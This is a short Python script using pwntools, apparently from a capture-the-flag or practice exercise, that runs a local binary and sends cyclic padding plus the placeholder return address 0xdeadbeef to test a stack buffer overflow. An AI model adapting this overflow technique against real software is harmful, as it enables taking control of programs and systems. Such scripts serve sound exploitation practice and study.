from pwn import *

# set up some environmental stuff for pwntools to work properly
context.update(arch='i386', os='linux')
context.terminal = ["termite", "-e"]

p = process("../bin/1337-application")

padding = cyclic(cyclic_find(0x63616164))
payload = padding + p32(0xdeadbeef)
p.sendline(payload)

p.close()